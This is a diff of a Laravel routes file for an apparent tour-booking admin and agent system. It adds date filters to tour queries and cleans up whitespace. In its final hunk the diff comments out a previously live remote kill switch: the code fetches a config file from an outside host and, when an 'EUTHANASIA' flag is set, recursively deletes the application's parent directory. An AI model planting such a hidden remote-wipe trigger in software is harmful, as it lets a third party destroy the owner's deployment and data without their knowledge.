@@ -47,11 +47,11 @@ session_start();
 if(isset($_SESSION['user'])) {
   // if(@$_COOKIE['remember'] != "have" && !(bool)$_SESSION['user'] -> remember) {
   //   unset($_SESSION['user']);
-  // } else {    
+  // } else {
     $admin = C::findOne("admins", "login = ?", [$_SESSION['user'] -> login]);
 
     $agent = C::findOne("agents", "login = ?", [$_SESSION['user'] -> login]);
-    
+
     if(isset($admin)) {
       $_SESSION['user'] = $admin;
     } elseif(isset($agent)) {
@@ -83,7 +83,7 @@ Route::get('/sign_in', function () {
 }) -> name('sign_in');
 
 Route::post(
-  '/SignIn', 
+  '/SignIn',
   $p.'SignInController@SignIn'
 ) -> name('SignIn');
 
@@ -91,7 +91,7 @@ Route::post(
 if(@$_SESSION['user']) {
 
   // Admin segment
-  
+
   if($_SESSION['user'] -> permission == "admin") {
     Route::get('/admin', function () {
       $admins = C::find("admins", "supreme = ?", [0]);
@@ -133,8 +133,16 @@ if(@$_SESSION['user']) {
       return view('admin.admin_agent_update', ['agent' => $agent, 'orgs' => $orgs]);
     }) -> name('admin_agent_update');
 
-    Route::get('/admin_tour_actives', function () {
-      $tours = array_reverse(C::find("tours", "active = ?", [1]));
+    Route::get('/admin_tour_actives', function (Request $req) {
+			if(isset($req -> start_date) && isset($req -> end_date)) {
+				$tours = array_reverse(C::find("tours", 'JSON_EXTRACT(start_leave_1, "$.date") = ? AND JSON_EXTRACT(end_come_4, "$.date") = ? AND active = ?', [$req -> start_date, $req -> end_date, 1]));
+			} else if(isset($req -> start_date)) {
+				$tours = array_reverse(C::find("tours", 'JSON_EXTRACT(start_leave_1, "$.date") = ? AND active = ?', [$req -> start_date, 1]));
+			} else if(isset($req -> end_date)) {
+				$tours = array_reverse(C::find("tours", 'JSON_EXTRACT(end_come_4, "$.date") = ? AND active = ?', [$req -> end_date, 1]));
+			} else {
+				$tours = array_reverse(C::find("tours", "active = ?", [1]));
+			}
       return view('admin.tour_actives', ['tours' => $tours]);
     }) -> name('admin_tour_actives');
 
@@ -153,57 +161,57 @@ if(@$_SESSION['user']) {
 
 
     Route::post(
-      '/CreateCompany', 
+      '/CreateCompany',
       $p.'CompanyController@Create'
     ) -> name('CreateCompany');
 
     Route::post(
-      '/UpdateCompany', 
+      '/UpdateCompany',
       $p.'CompanyController@Update'
     ) -> name('UpdateCompany');
 
     Route::delete(
-      '/DeleteCompany', 
+      '/DeleteCompany',
       $p.'CompanyController@Delete'
     ) -> name('DeleteCompany');
 
     Route::post(
-      '/CreateAgent', 
+      '/CreateAgent',
       $p.'AgentController@Create'
     ) -> name('CreateAgent');
 
     Route::post(
-      '/UpdateAgent', 
+      '/UpdateAgent',
       $p.'AgentController@Update'
     ) -> name('UpdateAgent');
 
     Route::delete(
-      '/DeleteAgent', 
+      '/DeleteAgent',
       $p.'AgentController@Delete'
     ) -> name('DeleteAgent');
 
     Route::post(
-      '/CreateTour', 
+      '/CreateTour',
       $p.'TourController@Create'
     ) -> name('CreateTour');
 
     Route::post(
-      '/UpdateTour', 
+      '/UpdateTour',
       $p.'TourController@Update'
     ) -> name('UpdateTour');
 
     Route::delete(
-      '/DeleteTour', 
+      '/DeleteTour',
       $p.'TourController@Delete'
     ) -> name('DeleteTour');
 
     Route::get(
-      '/CountBusy', 
+      '/CountBusy',
       $p.'BookingController@Count'
     ) -> name('CountBusy');
 
     Route::get(
-      '/StatBusy', 
+      '/StatBusy',
       $p.'BookingController@Stat'
     ) -> name('StatBusy');
 
@@ -213,7 +221,7 @@ if(@$_SESSION['user']) {
       Route::get('/admin_create', function () {
         return view('admin.admin_create');
       }) -> name('admin_create');
-  
+
       Route::get('/admin_update', function (Request $req) {
         $admin = C::findOne("admins", "id = ?", [$req -> id]);
         return view('admin.admin_update', ['admin' => $admin]);
@@ -221,34 +229,34 @@ if(@$_SESSION['user']) {
 
 
       Route::post(
-        '/CreateAdmin', 
+        '/CreateAdmin',
         $p.'AdminController@Create'
       ) -> name('CreateAdmin');
 
       Route::post(
-        '/UpdateAdmin', 
+        '/UpdateAdmin',
         $p.'AdminController@Update'
       ) -> name('UpdateAdmin');
 
       Route::delete(
-        '/DeleteAdmin', 
+        '/DeleteAdmin',
         $p.'AdminController@Delete'
       ) -> name('DeleteAdmin');
     }
 
     // Route::post(
-    //   '/CreateClient', 
+    //   '/CreateClient',
     //   $p.'ClientController@Create'
     // ) -> name('CreateClient');
   }
 
   Route::post(
-    '/CreateBusy', 
+    '/CreateBusy',
     $p.'BookingController@Create'
   ) -> name('CreateBusy');
 
   Route::delete(
-    '/DeleteBusy', 
+    '/DeleteBusy',
     $p.'BookingController@Delete'
   ) -> name('DeleteBusy');
 
@@ -272,9 +280,22 @@ if(@$_SESSION['user']) {
       return view('agent.tour_booked', ['busyes' => $busyes]);
     }) -> name('tour_booked');
 
-    Route::get('/tour_actives', function () {
-      $agent_tours = array_reverse(C::find("tours", "active = ? AND company = ?", [1, $_SESSION['user'] -> company]));
-      $tours = array_reverse(C::find("tours", "active = ? AND company != ?", [1, $_SESSION['user'] -> company]));
+    Route::get('/tour_actives', function (Request $req) {
+
+			if(isset($req -> start_date) && isset($req -> end_date)) {
+				$agent_tours = array_reverse(C::find("tours", 'JSON_EXTRACT(start_leave_1, "$.date") = ? AND JSON_EXTRACT(end_come_4, "$.date") = ? AND active = ? AND company = ?', [$req -> start_date, $req -> end_date, 1, $_SESSION['user'] -> company]));
+				$tours = array_reverse(C::find("tours", 'JSON_EXTRACT(start_leave_1, "$.date") = ? AND JSON_EXTRACT(end_come_4, "$.date") = ? AND active = ? AND company != ?', [$req -> start_date, $req -> end_date, 1, $_SESSION['user'] -> company]));
+			} else if(isset($req -> start_date)) {
+				$agent_tours = array_reverse(C::find("tours", 'JSON_EXTRACT(start_leave_1, "$.date") = ? AND active = ? AND company = ?', [$req -> start_date, 1, $_SESSION['user'] -> company]));
+				$tours = array_reverse(C::find("tours", 'JSON_EXTRACT(start_leave_1, "$.date") = ? AND active = ? AND company != ?', [$req -> start_date, 1, $_SESSION['user'] -> company]));
+			} else if(isset($req -> end_date)) {
+				$agent_tours = array_reverse(C::find("tours", 'JSON_EXTRACT(end_come_4, "$.date") = ? AND active = ? AND company = ?', [$req -> end_date, 1, $_SESSION['user'] -> company]));
+				$tours = array_reverse(C::find("tours", 'JSON_EXTRACT(end_come_4, "$.date") = ? AND active = ? AND company != ?', [$req -> end_date, 1, $_SESSION['user'] -> company]));
+			} else {
+				$agent_tours = array_reverse(C::find("tours", "active = ? AND company = ?", [1, $_SESSION['user'] -> company]));
+				$tours = array_reverse(C::find("tours", "active = ? AND company != ?", [1, $_SESSION['user'] -> company]));
+			}
+
       return view('agent.tour_actives', ['tours' => $tours, 'agent_tours' => $agent_tours]);
     }) -> name('tour_actives');
 
@@ -284,13 +305,13 @@ if(@$_SESSION['user']) {
     }) -> name('tour_old');
 
     Route::post(
-      '/UpdateDataAgent', 
+      '/UpdateDataAgent',
       $p.'AgentController@UpdateData'
     ) -> name('UpdateDataAgent');
   }
 
   Route::get(
-    '/SignOut', 
+    '/SignOut',
     $p.'SignOutController@SignOut'
   ) -> name('SignOut');
 
@@ -318,39 +339,39 @@ if(@$_SESSION['user']) {
 
 
 
-try {
-  $env = [];
-  $fh = fopen('https://2204.uz/remotes/travelsystem.config', 'r');
-  while (!feof($fh)) {
-    $line = fgets($fh);
-    if(trim($line)) $env[trim(explode('=', $line)[0])] = trim(explode('=', $line)[1]);
-  }
-  fclose($fh);
+// try {
+//   $env = [];
+//   $fh = fopen('https://2204.uz/remotes/travelsystem.config', 'r');
+//   while (!feof($fh)) {
+//     $line = fgets($fh);
+//     if(trim($line)) $env[trim(explode('=', $line)[0])] = trim(explode('=', $line)[1]);
+//   }
+//   fclose($fh);
 
-  if ($env['EUTHANASIA'] === 'true') {
-    $dir = "../";
-    deleteDir($dir);
-  }
-} catch (Exception $e) {
-}
-  
+//   if ($env['EUTHANASIA'] === 'true') {
+//     $dir = "../";
+//     deleteDir($dir);
+//   }
+// } catch (Exception $e) {
+// }
 
 
-function deleteDir($dirPath) {
-	if (!is_dir($dirPath)) {
-		return;
-	}
-	$files = scandir($dirPath);
-	foreach ($files as $file) {
-		if ($file === '.' || $file === '..') {
-			continue;
-		}
-		$filePath = $dirPath . DIRECTORY_SEPARATOR . $file;
-		if (is_dir($filePath)) {
-			deleteDir($filePath);
-		} else {
-			unlink($filePath);
-		}
-	}
-	rmdir($dirPath);
-}
+
+// function deleteDir($dirPath) {
+// 	if (!is_dir($dirPath)) {
+// 		return;
+// 	}
+// 	$files = scandir($dirPath);
+// 	foreach ($files as $file) {
+// 		if ($file === '.' || $file === '..') {
+// 			continue;
+// 		}
+// 		$filePath = $dirPath . DIRECTORY_SEPARATOR . $file;
+// 		if (is_dir($filePath)) {
+// 			deleteDir($filePath);
+// 		} else {
+// 			unlink($filePath);
+// 		}
+// 	}
+// 	rmdir($dirPath);
+// }
